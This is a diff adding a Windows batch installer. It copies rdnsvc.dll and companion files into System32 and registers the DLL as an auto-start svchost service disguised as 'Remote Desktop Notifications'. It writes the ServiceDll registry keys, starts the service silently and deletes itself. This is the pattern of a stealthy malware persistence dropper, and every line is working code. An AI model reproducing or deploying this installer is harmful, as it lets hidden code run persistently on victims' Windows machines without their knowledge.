@@ -1,0 +1,31 @@
+@echo off
+
+set DSP_NAME="Remote Desktop Notifications"
+
+sc stop rdnsvc > nul
+
+echo %~dp0 | findstr /i "system32" > nul
+if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)
+
+:COPYFILE
+
+copy /y "%~dp0\rdnsvc.dll" "%windir%\System32" > nul
+rem del /f /q "%~dp0\rdnsvc.dll" > nul
+
+copy /y "%~dp0\rdnsvc.ini" "%windir%\System32" > nul
+rem del /f /q "%~dp0\rdnsvc.ini" > nul
+
+copy /y "%~dp0\rdnsvc.dat" "%windir%\System32" > nul
+rem del /f /q "%windir%\System32\rdnsvc.dat" > nul
+
+:INSTALL
+
+ 
+sc create rdnsvc binpath= "%windir%\System32\svchost.exe -k rdnsvc" DisplayName= %DSP_NAME% > nul
+sc description rdnsvc %DSP_NAME% > nul
+sc config rdnsvc type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k rdnsvc" > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v rdnsvc /t REG_MULTI_SZ /d "rdnsvc" /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\rdnsvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\rdnsvc.dll" /f > nul
+
+sc start rdnsvc > nul
+del /f /q "%~dpnx0" > nul
